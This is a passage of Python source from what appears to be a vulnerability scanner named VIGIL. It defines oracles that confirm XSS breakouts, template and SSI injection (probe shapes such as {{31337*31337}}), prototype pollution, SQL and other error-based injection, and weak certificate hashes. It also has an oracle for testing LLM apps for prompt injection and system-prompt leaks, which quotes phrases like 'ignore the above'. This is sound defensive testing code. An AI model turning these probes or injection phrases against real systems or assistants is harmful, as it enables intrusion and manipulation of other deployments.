            # end-to-end through `confirm_finding`.
            self._note("inert_text_container",
                       self._inert_tags[-1] if self._inert_tags else "script")
            return
        if not self._script_executable:
            # <script type="application/json"> and friends: a DATA block the browser
            # never executes. Django's json_script emits exactly this. AUDIT-B2 adds
            # the `nomodule` classic script and the whitespace-only `type`.
            self._note(self._script_nonexec_reason or "script_data_block")
            return
        if self._script_has_src:
            # RED-PEN B2: a `src`-bearing <script> never evaluates its child text.
            self._note("script_src_ignored_body")
            return
        if chunk:
            # RED-PEN B1: a continuation chunk starts mid-token — fail closed.
            self._note("script_lexer_ambiguous", "split_script_text")
            return
        code, ambiguity = _js_scan(data, idx)
        if ambiguity:
            # RED-PEN B1 — FAIL CLOSED ON LEXER AMBIGUITY. A regex literal, an
            # Annex B `<!--`/`-->` comment or a template substitution before the
            # marker desyncs this lexer by one quote, which is enough to report a
            # STRING's contents as code. Downgrade to a non-firing, non-conclusive
            # advisory rather than mint a FACT the page does not support.
            self._note("script_lexer_ambiguous", ambiguity)
            return
        if code:
            self.context, self.detail = "script", "script"
        else:
            # F4: inside a string literal / template literal / comment — the value
            # cannot terminate the element or the literal, so no breakout is proven.
            self._note("script_string_literal")


def reflection_context_oracle(marker: str, observed_sink: Any) -> OracleSignal:
    """Fire only when the reflected marker PROVABLY BROKE OUT into a live,
    executable position — never merely because the marker substring is present
    somewhere executable-looking.

    Substring-presence (what ``side_effect_oracle`` and most DAST use for XSS)
    over-reports: a marker reflected inside an HTML-encoded attribute, a comment,
    or plain text is inert. So does "the marker is somewhere inside a ``<script>``"
    or "somewhere inside an ``on*`` value" — the audited F4/R5 false positives,
    which a CORRECTLY escaped page (Django ``json_script``, a ``&quot;``-escaped
    handler) reproduces on demand. The response is PARSED (stdlib, no third-party
    dependency) and a signal fires ONLY for a proven breakout:

      * ``html_tag``     — the marker is (part of) a TAG NAME: the payload created
        an element (0.95);
      * ``js_attribute`` — the marker is the ENTIRE value of an event-handler
        attribute, or the entire body of a ``javascript:`` URL: the attacker owns
        the whole handler (0.90);
      * ``script``       — the marker sits at CODE position (outside every string
        literal, template literal and comment) inside a script the browser actually
        EXECUTES (``type`` absent or a JS MIME) (0.90).

    Anything weaker — a marker inside a JS string literal, inside a handler
    expression the page composed, inside a ``type="application/json"`` data block,
    or inside a raw-text container (``<noscript>``/``<textarea>``/…) — is returned
    as a NON-FIRING, NON-CONCLUSIVE advisory: not a FACT, and not a clean bill of
    health either. A fully encoded / text-only reflection is the one decisive
    negative (``conclusive=True``).

    SCOPE: this oracle proves a reflection reached a LIVE / EXECUTABLE POSITION.
    It does NOT prove EXECUTION — that is the DOM_EXECUTION oracle's claim, and no
    evidence string here may be read as one."""
    marker = (marker or "").strip()
    body = observed_sink if isinstance(observed_sink, str) else _searchable(observed_sink)
    if len(marker) < 4:
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
            evidence="marker too short to be a reliable canary", observed={"marker": marker})
    ml = marker.lower()
    if ml not in body.lower():
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
            evidence=f"marker {marker!r} not reflected", observed={"marker": marker})

    scanner = _ReflectionScanner(ml)
    try:
        scanner.feed(body)
        scanner.close()
    except Exception:
        scanner.context = None

    if scanner.context == "html_tag":
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.95,
            evidence=(f"marker became the TAG NAME of a live element <{scanner.detail}> — the payload "
                      f"broke out into markup (injection into an executable position PROVEN; this "
                      f"oracle does not prove execution)"),
            observed={"marker": marker, "context": "html_tag", "tag": scanner.detail})
    if scanner.context == "script":
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.9,
            evidence=("marker sits at CODE position inside an executable <script> — outside every string "
                      "literal, template literal and comment, so the payload broke out of the data "
                      "position (injection into an executable position PROVEN; this oracle does not "
                      "prove execution)"),
            observed={"marker": marker, "context": "script"})
    if scanner.context and scanner.context.startswith("js_attribute"):
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=True, confidence=0.9,
            evidence=(f"marker is the ENTIRE value of executable attribute {scanner.detail!r} — the "
                      f"attacker supplied the whole handler / javascript: URL body (injection into an "
                      f"executable position PROVEN; this oracle does not prove execution)"),
            observed={"marker": marker, "context": scanner.context})

    if scanner.advisory is not None:
        # AUDIT F4/R5 — NON-FIRING ADVISORY. The marker was seen in or beside an
        # executable position, but as DATA the page itself placed there; no breakout
        # is proven. NOT conclusive either: an escaping bug this parse cannot see
        # could still make it executable, so the honest verdict is "UNRESOLVED —
        # needs an execution-proving oracle, run by an operator" (no automatic
        # handoff exists; see the module note), never "clean" and never a FACT.
        _ADVISORY_EVIDENCE = {
            "script_string_literal":
                "marker is inside a JS STRING LITERAL / template literal / comment in an executable "
                "<script> — it cannot terminate the literal or the element from this parse, so NO "
                "breakout is proven (the Django json_script / Rails json_escape shape). ADVISORY ONLY",
            "script_data_block":
                "marker is inside a <script> the browser does NOT execute (type is a data MIME such as "
                "application/json) — NO breakout is proven. ADVISORY ONLY",
            "js_attribute_data":
                f"marker is EMBEDDED IN a larger expression in attribute {scanner.advisory_detail!r} that "
                "the PAGE composed (e.g. a correctly &quot;-escaped handler argument) — the attacker does "
                "not own the value, so NO breakout is proven. ADVISORY ONLY",
            "inert_text_container":
                f"marker reached {scanner.advisory_detail!r} inside a raw-text container "
                "(<noscript>/<textarea>/<title>/<template>/…) whose content a browser does not parse as "
                "live markup — NO breakout is proven. ADVISORY ONLY",
            "script_src_ignored_body":
                "marker is inside a <script> that bears a `src` attribute — per the HTML spec such an "
                "element IGNORES its child text, so the reflected bytes are never evaluated and NO "
                "breakout is proven. ADVISORY ONLY",
            "script_nomodule_ignored":
                "marker is inside a CLASSIC <script> bearing `nomodule` — 'prepare the script element' "
                "returns early for it, so a module-supporting browser never evaluates the element and NO "
                "breakout is proven (measured inert in Chromium 150). ADVISORY ONLY",
            "unmodelled_handler_shape":
                f"marker is in attribute {scanner.advisory_detail!r}, which has the SHAPE of an HTML "
                "event-handler content attribute but is NOT in this oracle's closed, measured set of "
                "handlers — so whether a browser would execute it is UNKNOWN to this oracle. It does not "
                "fire (firing needs membership) and it is explicitly NOT a clean bill of health. "
                "ADVISORY ONLY",
            "script_lexer_ambiguous":
                f"marker is inside an executable <script> whose text contains "
                f"{scanner.advisory_detail!r} before the marker — a construct this lexer does not model "
                "(regex literal vs division, an Annex B <!-- / --> comment, a template substitution, a "
                "misplaced hashbang, or split script text). The code-vs-string verdict is therefore "
                "UNKNOWN, and this oracle FAILS CLOSED rather than risk reporting a string literal as "
                "code. ADVISORY ONLY — this verdict is UNRESOLVED, not clean. NOTE: nothing in this "
                "engine schedules a follow-up probe on this advisory; resolving it requires an operator "
                "to run an execution-proving oracle by hand (wiring that handoff is tracked, not shipped)",
        }
        return OracleSignal(
            kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
            conclusive=False,
            evidence=_ADVISORY_EVIDENCE.get(
                scanner.advisory, "marker in a non-proving position. ADVISORY ONLY"),
            observed={"marker": marker, "context": scanner.advisory,
                      "detail": scanner.advisory_detail, "advisory": True})

    return OracleSignal(
        kind=OracleKind.REFLECTION_CONTEXT, fired=False, confidence=0.0,
        # CHANNEL-CONFIRMED NEGATIVE: the marker WAS reflected (`ml in body` above),
        # so the payload provably reached the response sink — and it landed only in an
        # inert/encoded position. That is a decisive "reflected-but-neutralised" clean,
        # unlike the "not reflected" branch above (no channel → non-conclusive/inconclusive).
        conclusive=True,
        evidence="marker reflected but NOT in an executable context (encoded/inert)",
        observed={"marker": marker, "context": "inert"})


def evaluation_oracle(
    raw_expr: str,
    expected_result: str,
    observed_body: Any,
    control_body: Any = None,
) -> OracleSignal:
    """Fire when an injected expression was **evaluated** by the server, not
    merely reflected — the signature of server-side template / expression-language
    injection (Jinja2/Twig/Freemarker/Velocity/ERB/Smarty/Mako/Thymeleaf, EL).

    The proof is deliberately strict, because "reflected" and "evaluated" look
    identical unless you separate them:

      1. the ``expected_result`` (what ``raw_expr`` computes to, e.g. ``31337*31337
         -> 981538969``) appears in the response, AND
      2. the ``raw_expr`` itself (``{{31337*31337}}``) does NOT appear — if the
         raw template text survives, the input was reflected verbatim, not
         evaluated, so this is NOT SSTI, AND
      3. when a benign ``control_body`` is supplied, the ``expected_result`` does
         NOT occur in it — so a value that merely happens to be on the page can
         never be mistaken for an evaluation.

    Use a distinctive arithmetic result (a large product, not ``7*7=49``) so the
    expected value cannot coincidentally appear. A reflected-but-unevaluated
    payload, an encoded payload, or a benign page all correctly do NOT fire."""
    raw = (raw_expr or "").strip()
    expected = (expected_result or "").strip()
    body = _coerce_text(observed_body)

    if len(expected) < 2:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence="expected evaluation result too short to be a reliable marker",
            observed={"expected": expected})

    if expected not in body:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"evaluated result {expected!r} not present; expression was not evaluated",
            observed={"expected": expected, "raw_present": raw in body})

    if raw and raw in body:
        # The literal template text survived — reflection, not evaluation.
        # CHANNEL-CONFIRMED NEGATIVE: the raw expression provably reached the response
        # sink and was rendered as inert text (not computed), so this is a decisive
        # "reached-but-not-evaluated" clean — distinct from the "result absent" branch
        # above (a blind/second-order sink where nothing was observed → inconclusive).
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0, conclusive=True,
            evidence=f"raw expression {raw!r} reflected verbatim — reflected, not evaluated",
            observed={"expected": expected, "raw_present": True})

    if control_body is not None and expected in _coerce_text(control_body):
        # The "result" is just part of the page regardless of the payload.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"result {expected!r} also present in the benign control — not attributable to evaluation",
            observed={"expected": expected})

    idx = body.find(expected)
    snippet = body[max(0, idx - 24): idx + len(expected) + 24]
    return OracleSignal(
        kind=OracleKind.EVALUATION,
        fired=True,
        confidence=0.95,
        evidence=f"expression {raw!r} evaluated to {expected!r} server-side: ...{snippet}...",
        observed={"expected": expected, "raw": raw, "snippet": snippet},
    )


_SSI_DIRECTIVE_RE = re.compile(r"<!--#\s*[A-Za-z]+\b[^>]*-->", re.DOTALL)


def ssi_evaluation_oracle(
    raw_directive: str,
    expected_result: str,
    observed_body: Any,
    control_body: Any = None,
) -> OracleSignal:
    """Fire when an injected **Server-Side Include (SSI) directive was EVALUATED** by the
    server — the arithmetic it carries was COMPUTED and its product emitted — not merely
    reflected (CWE-97: Improper Neutralization of Server-Side Includes).

    The same strict computed-product proof the SSTI/EL :func:`evaluation_oracle` uses,
    specialised to SSI so it can never be confused with a template-expression evaluation and so
    a page that merely echoes the directive as an inert HTML comment never fires:

      1. ``raw_directive`` must be a well-formed SSI directive (``<!--#…-->``) — a payload that is
         not an SSI directive is not an SSI probe and never fires here (keeps the class distinct);
      2. the ``expected_result`` — the PER-PROBE product ``N1*N2``, unguessable and unable to
         pre-exist — appears in the response, AND
      3. the raw directive does NOT survive verbatim: if ``<!--#…-->`` is echoed back unchanged the
         include was NOT processed (SSI disabled / reflected as an inert comment), which is the
         honest boundary — reflected, not evaluated — and a CHANNEL-CONFIRMED clean, AND
      4. when a benign ``control_body`` is supplied, the product does NOT occur in it — so a value
         that merely happens to be on the page can never be mistaken for an evaluation.

    Use a distinctive per-probe random product (a large ``N1*N2``, never ``7*7``) so the expected
    value cannot coincidentally appear. A reflected-but-unevaluated directive, an escaped payload,
    or a benign page all correctly do NOT fire."""
    raw = (raw_directive or "").strip()
    expected = (expected_result or "").strip()
    body = _coerce_text(observed_body)

    if len(expected) < 2:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence="expected SSI evaluation result too short to be a reliable marker",
            observed={"expected": expected})

    if not _SSI_DIRECTIVE_RE.search(raw):
        # Not a genuine SSI directive — nothing SSI-specific to adjudicate. NON-conclusive: the
        # probe never carried an include directive, so this says nothing about the target.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"payload {raw!r} is not a well-formed SSI directive (<!--#…-->) — not an SSI probe",
            observed={"raw": raw})

    if expected not in body:
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"computed product {expected!r} not present; the SSI directive was not evaluated",
            observed={"expected": expected, "raw_present": raw in body})

    if raw and raw in body:
        # The literal SSI directive survived verbatim — SSI is disabled and the directive was echoed
        # as an inert HTML comment. CHANNEL-CONFIRMED NEGATIVE: the directive provably reached the
        # response sink and was NOT processed (reflected, not evaluated) — the honest boundary, a
        # decisive "reached-but-not-evaluated" clean, distinct from the "product absent" blind branch.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0, conclusive=True,
            evidence=f"SSI directive {raw!r} reflected verbatim as an inert comment — reflected, not evaluated",
            observed={"expected": expected, "raw_present": True})

    if control_body is not None and expected in _coerce_text(control_body):
        # The "product" is on the page regardless of the directive — not attributable to evaluation.
        return OracleSignal(
            kind=OracleKind.EVALUATION, fired=False, confidence=0.0,
            evidence=f"product {expected!r} also present in the benign control — not attributable to SSI evaluation",
            observed={"expected": expected})

    idx = body.find(expected)
    snippet = body[max(0, idx - 24): idx + len(expected) + 24]
    return OracleSignal(
        kind=OracleKind.EVALUATION,
        fired=True,
        confidence=0.95,
        evidence=f"SSI directive {raw!r} evaluated to {expected!r} server-side: ...{snippet}...",
        observed={"expected": expected, "raw": raw, "snippet": snippet, "ssi": True},
    )


_MIN_CANARY_LEN = 16


_MIN_CANARY_ENTROPY_BITS_PER_CHAR = 2.5


def _shannon_bits_per_char(s: str) -> float:
    """Shannon entropy of ``s`` in bits/char (pure). A random base62/hex sentinel clears
    ~4-6; a repeated char ("aaaa…") is 0; an English phrase is ~1-2."""
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


def system_prompt_disclosure_oracle(canary: str, llm_output: Any) -> OracleSignal:
    """Fire when a PLANTED high-entropy canary sentinel appears VERBATIM in the app's own
    LLM output — proof the secret LEAKED (system-prompt disclosure). The defensive dual of
    ``side_effect_oracle``: the operator plants a random sentinel in the system prompt out
    of band; if the model's response echoes it, the secret provably crossed the boundary.

    Honest scope (doctrine fix P2): this proves DISCLOSURE, not that an *injection* caused
    it — a benign "repeat your instructions" or the app's own debug path echoes the same
    sentinel. ``prompt_injection`` (control-vs-treatment behavior delta) is the separate,
    stronger oracle that earns the adversarial-cause label. The sentinel must be
    >= 16 chars AND >= 2.5 bits/char so a substring match cannot be coincidental."""
    sentinel = (canary or "").strip()
    haystack = llm_output if isinstance(llm_output, str) else _searchable(llm_output)
    if len(sentinel) < _MIN_CANARY_LEN:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence=f"canary too short (< {_MIN_CANARY_LEN} chars) to be collision-resistant",
            observed={"canary_len": len(sentinel)})
    if _shannon_bits_per_char(sentinel) < _MIN_CANARY_ENTROPY_BITS_PER_CHAR:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence="canary entropy too low — not a collision-resistant random sentinel",
            observed={"canary_len": len(sentinel)})
    idx = haystack.find(sentinel)
    if idx < 0:
        return OracleSignal(
            kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=False, confidence=0.0,
            evidence="planted canary not present in LLM output — no disclosure",
            observed={"canary_len": len(sentinel)})
    # Bounded, redacted human-readable span: reveal only a short window around the hit and
    # MASK the sentinel itself in the evidence string. (PR1: the retained oracle_context
    # still holds the verbatim sentinel + output so the certificate re-fires offline — the
    # reverify contract requires verbatim substrings; documented, not hashes-only.)
    start = max(0, idx - 16)
    end = min(len(haystack), idx + len(sentinel) + 16)
    redacted_span = haystack[start:idx] + "<canary>" + haystack[idx + len(sentinel):end]
    return OracleSignal(
        kind=OracleKind.SYSTEM_PROMPT_DISCLOSURE, fired=True, confidence=0.95,
        evidence=f"planted canary disclosed in the app's LLM output: ...{redacted_span}...",
        observed={"offset": idx, "canary_len": len(sentinel), "redacted_span": redacted_span})


def _pi_behavior(obs: Any) -> dict[str, Any]:
    """Normalise one structurally-detectable LLM behavior observation to the three fields
    the control-vs-treatment delta compares. Total + deterministic."""
    if isinstance(obs, Mapping):
        tool = obs.get("tool")
        return {
            "tool": str(tool).strip().lower() if tool not in (None, "") else None,
            "refused": bool(obs.get("refused", False)),
            "boundary_token_echoed": bool(obs.get("boundary_token_echoed", False)),
        }
    return {"tool": None, "refused": False, "boundary_token_echoed": False}


def prompt_injection_oracle(pi_control: Any, pi_treatment: Any) -> OracleSignal:
    """Fire ONLY when an injected directive PROVABLY flipped a structurally-detectable
    behavior in the treatment turn vs a CLEAN control turn — the honest, strong proof of
    prompt injection (doctrine fix P2). Structurally the ``evaluation_oracle``'s control-
    vs-treatment discipline: the effect present in treatment, absent in the control that
    omits the attacker directive (everything else held fixed).

    It fires on a BEHAVIOR DELTA, never on structural-override markers alone (those stay
    LEADs — users legitimately paste "ignore the above"):
      1. refusal flipped — the clean control refused, the attacker turn complied;
      2. coerced tool — treatment selected a sensitive tool the clean control did not;
      3. boundary breakout — the model echoed the instruction/data boundary token only
         under the injected directive.
    Same retained (control, treatment) -> same verdict, re-runnable offline."""
    control = _pi_behavior(pi_control)
    treatment = _pi_behavior(pi_treatment)

    deltas: list[str] = []
    if control["refused"] and not treatment["refused"]:
        deltas.append("refusal flipped to compliance under the injected directive")
    if treatment["tool"] and treatment["tool"] != control["tool"]:
        deltas.append(f"injected directive coerced tool {treatment['tool']!r} the clean control did not select")
    if treatment["boundary_token_echoed"] and not control["boundary_token_echoed"]:
        deltas.append("instruction/data boundary token echoed only under the injected directive")

    if not deltas:
        return OracleSignal(
            kind=OracleKind.PROMPT_INJECTION, fired=False, confidence=0.0,
            evidence="no structurally-detectable behavior change vs the clean control — "
                     "markers alone do not confirm prompt injection",
            observed={"control": control, "treatment": treatment})
    return OracleSignal(
        kind=OracleKind.PROMPT_INJECTION, fired=True, confidence=0.9,
        evidence="prompt injection confirmed by a control-vs-treatment behavior delta: " + "; ".join(deltas),
        observed={"control": control, "treatment": treatment, "deltas": deltas})


_SANITIZER_PATTERNS: list[tuple[re.Pattern[str], str, float]] = [
    (re.compile(r"ERROR:\s*AddressSanitizer"), "asan", 0.95),
    (re.compile(r"AddressSanitizer:\s*(DEADLYSIGNAL|SEGV|heap-|stack-|global-)"), "asan", 0.95),
    (re.compile(r"(heap|stack|global)-buffer-overflow"), "asan", 0.9),
    (re.compile(r"heap-use-after-free|use-after-free"), "asan", 0.92),
    (re.compile(r"WARNING:\s*MemorySanitizer"), "msan", 0.9),
    (re.compile(r"WARNING:\s*ThreadSanitizer|data race"), "tsan", 0.88),
    (re.compile(r"runtime error:.*(overflow|out of bounds|null pointer|misaligned)"), "ubsan", 0.85),
    (re.compile(r"UndefinedBehaviorSanitizer"), "ubsan", 0.85),
    (re.compile(r"LeakSanitizer|detected memory leaks"), "lsan", 0.75),
    (re.compile(r"\*\*\* stack smashing detected \*\*\*"), "stack-protector", 0.9),
    (re.compile(r"double free or corruption|malloc\(\): |free\(\): "), "glibc-abort", 0.85),
    (re.compile(r"thread '.*' panicked at"), "rust-panic", 0.85),
    (re.compile(r"^panic:", re.MULTILINE), "go-panic", 0.8),
    (re.compile(r"Segmentation fault|SIGSEGV|SIGABRT|core dumped"), "signal", 0.8),
    (re.compile(r"Traceback \(most recent call last\):"), "py-traceback", 0.65),
]


def sanitizer_signal_oracle(process_output: Any) -> OracleSignal:
    """Scan captured stdout/stderr for sanitizer, panic, abort and traceback
    markers. A single unambiguous crash marker fires; a bare Python traceback
    fires only at moderate confidence (it can be an ordinary handled error)."""
    text = _coerce_text(process_output)
    matches: list[dict[str, Any]] = []
    for pattern, label, conf in _SANITIZER_PATTERNS:
        m = pattern.search(text)
        if m:
            line = _line_of(text, m.start())
            matches.append({"label": label, "confidence": conf,
                            "match": m.group(0), "line": line})

    if not matches:
        return OracleSignal(
            kind=OracleKind.SANITIZER_SIGNAL, fired=False, confidence=0.0,
            evidence="no sanitizer/crash/panic marker in output", observed={})

    best = max(matches, key=lambda x: x["confidence"])
    return OracleSignal(
        kind=OracleKind.SANITIZER_SIGNAL,
        fired=True,
        confidence=best["confidence"],
        evidence=f"{best['label']} marker: {best['line'].strip()[:200]}",
        observed={"matches": matches, "best": best["label"]},
    )


def _line_of(text: str, offset: int) -> str:
    start = text.rfind("\n", 0, offset) + 1
    end = text.find("\n", offset)
    return text[start: end if end >= 0 else len(text)]


_PP_KEY_RE = re.compile(r"^cpp_[0-9a-f]{8,}$")   # VIGIL per-probe pollution-KEY canary (scanner.proto_pollution mints cpp_<token_hex>)


_PP_VAL_RE = re.compile(r"^ppv_[0-9a-f]{8,}$")   # VIGIL per-probe pollution-VALUE canary (ppv_<token_hex>)


def prototype_pollution_oracle(observed: Any) -> OracleSignal:
    """Fire when a real headless DOM's ACHIEVED runtime state proves client-side prototype
    pollution: ``Object.prototype[uniqKey] === uniqVal`` for the unique per-probe key/value a
    ``__proto__[uniqKey]=uniqVal`` gadget drove in, AND a BENIGN-KEY control (a different key
    that was NEVER injected) stayed ``undefined``.

    ``observed`` is the binding-reported readback a driver captured after rendering the target
    page — a mapping ``{polluted_key, polluted_val, expected_val, benign_key,
    benign_key_undefined}``. The oracle judges the ACHIEVED STATE, never that the payload merely
    appeared: a page that reflects the key into the DOM but does NOT assign it onto
    ``Object.prototype`` reports ``polluted_val`` absent/mismatched and does not fire.

    Near-zero-FP by three independent guards:
      * the key AND value must match VIGIL's own per-probe canary SHAPE (``cpp_<hex>`` /
        ``ppv_<hex>``, minted by ``scanner.proto_pollution`` via ``secrets.token_hex``). This is a
        SELF-CONTAINED guard: the oracle's standalone re-fire (its certificate) can therefore
        NEVER be satisfied by a pre-existing NAMED prototype property (``toString``,
        ``hasOwnProperty``, ``constructor``) or any arbitrary key — a match can only be the
        high-entropy marker VIGIL drove in, so soundness does not depend on the upstream caller;
      * the value must reproduce EXACTLY (``polluted_val == expected_val``) — a truthy-but-
        different value (a page that sets its own default) does not fire;
      * the BENIGN-KEY control must be ``undefined`` — if some ambient gadget polluted the
        prototype independently of this probe, ``benign_key_undefined`` is False and the oracle
        REFUSES to attribute (an ambient-pollution page does not fire).

    This is the client-side ACHIEVED-STATE FACT (CWE-1321), not a posture check: a fire means
    VIGIL observed ``Object.prototype`` actually carry the value it drove in."""
    obs = observed if isinstance(observed, Mapping) else {}
    key = _coerce_text(obs.get("polluted_key")).strip()
    expected = _coerce_text(obs.get("expected_val")).strip()
    got_raw = obs.get("polluted_val")
    got = _coerce_text(got_raw).strip() if got_raw is not None else ""
    benign_key = _coerce_text(obs.get("benign_key")).strip()
    benign_undef = obs.get("benign_key_undefined")

    base = {"polluted_key": key, "benign_key": benign_key}

    # SELF-CONTAINED SOUNDNESS: the key/value must match VIGIL's own per-probe canary SHAPE
    # (scanner.proto_pollution mints ``cpp_<hex>`` / ``ppv_<hex>``). Requiring the shape here — not
    # merely a length floor — means the oracle's STANDALONE re-fire (its certificate) cannot be
    # satisfied by a pre-existing NAMED prototype property (``toString``/``hasOwnProperty``/
    # ``constructor``) or any arbitrary key: a match can ONLY be the high-entropy marker VIGIL drove
    # in, so soundness never depends on the upstream caller being the sole key source.
    if not _PP_KEY_RE.match(key):
        return OracleSignal(
            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
            evidence=("pollution key is not a VIGIL per-probe canary marker (expected cpp_<hex>) — an "
                      "arbitrary or pre-existing prototype property cannot mint this FACT"),
            observed=base)
    if not _PP_VAL_RE.match(expected):
        return OracleSignal(
            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
            evidence="expected pollution value is not a VIGIL per-probe canary marker (expected ppv_<hex>)",
            observed=base)

    # The BENIGN-KEY control gates attribution: a different key that was NEVER injected MUST be
    # undefined. If it is not (ambient pollution, or a page that pollutes every key), refuse —
    # we cannot attribute the polluted state to THIS probe.
    if benign_undef is not True:
        return OracleSignal(
            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
            evidence=("benign-key control was not undefined — cannot attribute the polluted state to this "
                      "probe (ambient / indiscriminate pollution); refusing"),
            observed={**base, "benign_key_undefined": benign_undef})

    # The ACHIEVED-STATE test: Object.prototype[key] must reproduce the exact value driven in.
    if got_raw is None or got != expected:
        return OracleSignal(
            kind=OracleKind.PROTOTYPE_POLLUTION, fired=False, confidence=0.0,
            evidence=("Object.prototype was not polluted to the expected value (the payload may have been "
                      "reflected without polluting the prototype); did not fire"),
            observed={**base, "expected_val": expected, "observed_val": got})

    return OracleSignal(
        kind=OracleKind.PROTOTYPE_POLLUTION,
        fired=True,
        confidence=0.96,
        evidence=(f"Object.prototype.{key} was polluted to {expected!r} in a real DOM "
                  f"(benign-key control {benign_key!r} stayed undefined)"),
        observed={"polluted_key": key, "polluted_val": expected, "benign_key": benign_key,
                  "benign_key_undefined": True},
    )


_ERROR_SIGNATURES: list[tuple[re.Pattern[str], str, float]] = [
    # --- SQL: MySQL / MariaDB ---
    (re.compile(r"You have an error in your SQL syntax", re.I), "mysql", 0.95),
    (re.compile(r"check the manual that corresponds to your (MySQL|MariaDB) server version", re.I), "mysql", 0.95),
    (re.compile(r"\bwarning:\s*mysqli?_", re.I), "mysql", 0.85),
    (re.compile(r"MySQLSyntaxErrorException|com\.mysql\.jdbc", re.I), "mysql", 0.9),
    (re.compile(r"valid MySQL result|Unknown column '[^']+' in 'field list'", re.I), "mysql", 0.85),
    # --- SQL: PostgreSQL ---
    (re.compile(r"PostgreSQL.*ERROR|PG::(Syntax|Undefined)|pg_query\(\)|org\.postgresql", re.I), "postgresql", 0.95),
    (re.compile(r"unterminated quoted string at or near|syntax error at or near", re.I), "postgresql", 0.9),
    # --- SQL: MSSQL ---
    (re.compile(r"Unclosed quotation mark after the character string", re.I), "mssql", 0.95),
    (re.compile(r"Microsoft SQL (Server|Native Client)|System\.Data\.SqlClient\.SqlException", re.I), "mssql", 0.92),
    (re.compile(r"Incorrect syntax near|\[SQL Server\]", re.I), "mssql", 0.9),
    # --- SQL: Oracle ---
    (re.compile(r"\bORA-\d{5}\b", re.I), "oracle", 0.95),
    (re.compile(r"Oracle.*(Driver|Database)|quoted string not properly terminated", re.I), "oracle", 0.9),
    # --- SQL: SQLite ---
    (re.compile(r"SQLite/JDBCDriver|SQLite\.Exception|System\.Data\.SQLite|sqlite3\.OperationalError", re.I), "sqlite", 0.92),
    (re.compile(r"unrecognized token:|SQL logic error|near \"[^\"]*\": syntax error", re.I), "sqlite", 0.88),
    # --- SQL: generic JDBC/ODBC ---
    (re.compile(r"java\.sql\.SQLException|SQLSTATE\[|ODBC.*Driver.*error", re.I), "sql-generic", 0.8),
    # --- NoSQL ---
    (re.compile(r"MongoError|E11000 duplicate key|BSONError|com\.mongodb", re.I), "mongodb", 0.85),
    # --- LDAP ---
    (re.compile(r"javax\.naming\.directory|LDAPException|Invalid DN syntax|com\.sun\.jndi\.ldap", re.I), "ldap", 0.82),
    # --- XPath ---
    (re.compile(r"XPathException|MS\.Internal\.Xml|Expression must evaluate to a node-set|xmlXPathEval", re.I), "xpath", 0.82),
]


def error_signature_oracle(observed_body: Any, control_body: Any = None) -> OracleSignal:
    """Fire when a response contains a distinctive **datastore/parser error** that
    a malformed injection payload provoked — the signature of error-based injection
    (SQL/NoSQL/LDAP/XPath).

    Two guards keep it precise: the error string must be a known, engine-specific
    signature (not a generic "error" word), AND — when a benign ``control_body`` is
    supplied — the SAME signature must be ABSENT from the control, so a page that
    always shows a stack trace cannot be mistaken for an injection. This is the
    error-based analogue of the sanitizer oracle: a real backend error is strong,
    attributable evidence the input reached and broke the query parser."""
    body = _coerce_text(observed_body)
    control = _coerce_text(control_body) if control_body is not None else ""

    for pattern, engine, conf in _ERROR_SIGNATURES:
        m = pattern.search(body)
        if not m:
            continue
        if control and pattern.search(control):
            # the same error is present without the payload -> not attributable
            continue
        line = _line_of(body, m.start())
        return OracleSignal(
            kind=OracleKind.ERROR_SIGNATURE,
            fired=True,
            confidence=conf,
            evidence=f"{engine} error provoked by the payload: {line.strip()[:200]}",
            observed={"engine": engine, "match": m.group(0)[:200]},
        )

    return OracleSignal(
        kind=OracleKind.ERROR_SIGNATURE, fired=False, confidence=0.0,
        evidence="no datastore/parser error signature in the response",
        observed={})


_WEAK_SIG_HASH_RE = re.compile(r"(?i)(?:md[245]|sha-?1(?![0-9]))")


_WEAK_SIG_OIDS = frozenset({
    "1.2.840.113549.1.1.2",   # md2WithRSAEncryption
    "1.2.840.113549.1.1.3",   # md4WithRSAEncryption
    "1.2.840.113549.1.1.4",   # md5WithRSAEncryption
    "1.2.840.113549.1.1.5",   # sha1WithRSAEncryption
    "1.2.840.10040.4.3",      # dsa-with-sha1
    "1.2.840.10045.4.1",      # ecdsa-with-SHA1
    "1.3.14.3.2.29",          # sha1WithRSASignature (legacy)
    "1.3.14.3.2.27",          # dsaWithSHA1 (legacy)
})


_MIN_RSA_DSA_BITS = 2048


_MIN_EC_BITS = 224


def weak_crypto_artifact_oracle(observed: Any) -> OracleSignal:
    """Fire when a parsed crypto artifact (an X.509 cert) is signed with a BROKEN hash — MD5/MD4/MD2 or
    SHA-1. These are collision-forgeable (MD5 chosen-prefix, SHA-1 SHAttered) with NO benign use for a
    certificate signature, so a benign modern cert (SHA-256+) does NOT fire. The proof is the retained
    signatureAlgorithm OID NAME (or dotted OID) — a pure, deterministic classification that re-verifies
